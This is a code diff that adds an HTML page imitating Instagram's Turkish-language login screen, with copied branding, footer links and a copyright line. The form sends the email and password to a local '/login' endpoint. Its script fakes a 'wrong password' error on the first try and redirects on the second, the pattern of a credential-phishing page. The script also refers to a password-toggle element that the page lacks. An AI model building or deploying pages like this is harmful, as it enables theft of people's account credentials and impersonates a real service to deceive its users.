@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş yap - Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="/images/title.jpg" type="image/png">
+    <link rel="shortcut icon" href="/images/title.jpg" type="image/png">
+<style>
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #000000;
+    transform: scale(0.9); /* Scaling everything down by 10% */
+    transform-origin: center;
+}
+
+.container {
+    height: 525px; /* Reduced 10% */
+    width: 405px; /* Reduced 10% */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    border: 1px solid rgb(73, 73, 73);
+    margin-top: 20px;
+}
+
+.container2 {
+    height: 73.8px; /* Reduced 10% */
+    width: 405px; /* Reduced 10% */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border: 1px solid rgb(73, 73, 73);
+}
+
+.login-box {
+    border-radius: 10px;
+    width: 360px; /* Reduced 10% */
+    padding: 36px; /* Reduced 10% */
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    background-color: black;
+}
+
+h2 {
+    font-size: 1.8em; /* Reduced 10% */
+    margin-bottom: 18px; /* Reduced 10% */
+    color: #ffffff;
+}
+
+.input-container {
+    position: relative;
+    margin-bottom: 18px; /* Reduced 10% */
+}
+
+input {
+    color: rgb(255, 255, 255);
+    background-color: rgba(73, 73, 73, 0.247);
+    border: 1px solid rgb(73, 73, 73);
+    border-radius: 5px;
+    font-size: 13.5px; /* Reduced 10% */
+    padding: 9px; /* Reduced 10% */
+    width: 100%;
+    box-sizing: border-box;
+}
+
+input:focus {
+    outline: none;
+    border-color: rgb(73, 73, 73);
+    color: rgb(255, 255, 255);
+    background-color: rgba(73, 73, 73, 0.247);
+}
+
+.input-container label {
+    position: absolute;
+    top: 50%;
+    left: 10px;
+    color: rgb(73, 73, 73);
+    pointer-events: none;
+    transition: 0.3s ease;
+    transform: translateY(-50%);
+    font-size: 13.5px; /* Reduced 10% */
+}
+
+input:focus + label, input:not(:placeholder-shown) + label {
+    top: -9px; /* Reduced 10% */
+    font-size: 11px; /* Reduced 10% */
+    color: rgb(73, 73, 73);
+}
+
+.forgot-password {
+    margin-top: 9px; /* Reduced 10% */
+    font-size: 12.6px; /* Reduced 10% */
+}
+
+.forgot-password a {
+    color: #0095f6;
+    text-decoration: none;
+}
+
+.login-button {
+    margin-top: 18px; /* Reduced 10% */
+}
+
+button {
+    width: 100%;
+    padding: 9px; /* Reduced 10% */
+    background-color: #0095f6;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 14.4px; /* Reduced 10% */
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #007bb5;
+}
+
+.separator {
+    margin: 18px 0; /* Reduced 10% */
+}
+
+.separator span {
+    font-size: 12.6px; /* Reduced 10% */
+    color: #999;
+}
+
+.facebook-login button {
+    width: 100%;
+    padding: 9px; /* Reduced 10% */
+    background-color: #4267b2;
+    color: white;
+    border: none;
+    border-radius: 7px;
+    font-size: 14.4px; /* Reduced 10% */
+    cursor: pointer;
+}
+
+.facebook-login button:hover {
+    background-color: #365899;
+}
+
+.signup-link {
+    margin-top: 18px; /* Reduced 10% */
+    font-size: 12.6px; /* Reduced 10% */
+}
+
+.signup-link a {
+    color: #0095f6;
+    text-decoration: none;
+}
+
+.line {
+    width: 72%; /* Reduced 10% */
+    height: 1px;
+    background-color: rgb(73, 73, 73);
+    margin: 7.2px; /* Reduced 10% */
+}
+
+/* Hata mesajı stili */
+.error-message {
+    color: red;
+    font-size: 14px;
+    margin-top: 10px;
+}
+.footer {
+    padding: 20px;
+}
+.links {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 15px;
+    margin-top: 10px;
+}
+.links a {
+    color: gray;
+    text-decoration: none;
+    font-size: 14px;
+}
+.links a:hover {
+    text-decoration: underline;
+}
+.download-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 15px;
+}
+.download-buttons img {
+    height: 40px;
+}
+.copyright {
+    margin-top: 10px;
+    font-size: 12px;
+    color: gray;
+}
+.activate-windows {
+    margin-top: 15px;
+    color: gray;
+    font-size: 14px;
+}
+</style>
+</head>
+<body>
+    <center>
+        <div style="background-color: #000000;">
+            <div class="container">
+                <div class="login-box">
+                    <br>
+                    <br>
+                    <img src="ins.png" alt="Instagram Logo">
+                    <br><br>
+                    <form id="loginForm" action="/login" method="POST">
+                        <div class="input-container">
+                            <input type="text" id="email" name="email" placeholder=" " required>
+                            <label for="email">Telefon numarası, kullanıcı adı veya e-posta</label>
+                        </div>
+                        <div class="input-container">
+                            <input type="password" id="password" name="password" placeholder=" " required>
+                            <label for="password">Şifre</label>
+                        </div>
+                        <div class="login-button">
+                            <button type="submit">Giriş Yap</button>
+                        </div>
+                    </form>
+                    
+                    
+                    
+                    
+                    <div class="separator">
+                        <span style="display: flex;">
+                            <div class="line"></div> YADA <div class="line"></div>
+                        </span>
+                    </div>
+                    <div class="facebook-login">
+                        <button><a href="https://www.facebook.com/" style="text-decoration: none;color: #ffffff;">Facebook ile Giriş yap</a></button>
+                    </div><br>
+                    <div class="forgot-password">
+                        <a href="https://www.instagram.com/accounts/emailsignup/" style="color: white;font-size: 15px;">Şifreni mi unuttun?</a>
+                    </div>
+                    <!-- Hata mesajı buraya eklenecek -->
+                    <div id="errorMessage" class="error-message" style="display: none;">Şifre hatalı! Lütfen tekrar deneyin.</div>
+                </div>
+            </div>
+            <br>
+            <div class="container2">
+                <p style="color: white;">Hesabın yok mu?  <h4 style="color: #0095f6;">Kaydol</h4> </p>
+            </div>
+            <br>
+            <center>
+                <div class="tt">
+                    <p style="color: white; font-family: Arial, Helvetica, sans-serif;">Uygulamayı indir.</p>
+                </div>
+            </center>
+        </div>
+
+        <div class="footer">
+            <div class="download-buttons">
+                <img src="1.jpg" alt="Google Play'den Alın" style="height: 65px;width: 175px;">
+                <img src="2.jpg" alt="Microsoft'tan Edinin" style="height: 65px;width: 175px; ">
+            </div>
+            <div class="links">
+                <a href="#">Meta</a>
+                <a href="#">Hakkında</a>
+                <a href="#">Blog</a>
+                <a href="#">İş Fırsatları</a>
+                <a href="#">Yardım</a>
+                <a href="#">API</a>
+                <a href="#">Gizlilik</a>
+                <a href="#">Koşullar</a>
+                <a href="#">Konumlar</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Threads</a>
+                <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                Türkçe ⬇ © 2025 Instagram from Meta
+            </div>
+            
+        </div>
+    </center>
+
+        <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('password');
+        const errorMessage = document.getElementById("errorMessage");
+        const loginForm = document.getElementById("loginForm");
+
+        let loginAttempts = 0;
+
+        togglePassword.addEventListener('click', function () {
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+            togglePassword.textContent = type === 'password' ? 'Göster' : 'Gizle';
+        });
+
+        loginForm.addEventListener("submit", function(event) {
+            event.preventDefault();  // Formun normalde gönderilmesini engelle
+
+            const email = document.getElementById("email").value;
+            const passwordValue = document.getElementById("password").value;
+
+            if (!email || !passwordValue) {
+                errorMessage.textContent = "Lütfen tüm alanları doldurun!";
+                errorMessage.style.display = "block";
+            } else if (loginAttempts === 0) {
+                // Hatalı girişte hata mesajını göster
+                errorMessage.textContent = "Şifre hatalı! Lütfen tekrar deneyin.";
+                errorMessage.style.display = "block";
+                loginAttempts++;  // Giriş denemesi yapılmış oldu
+            } else {
+                // Başarılı giriş, yeni sayfaya yönlendir
+                window.location.href = "/about";  // Başka bir sayfaya yönlendir
+            }
+        });
+    </script>
+
+</body>
+</html>
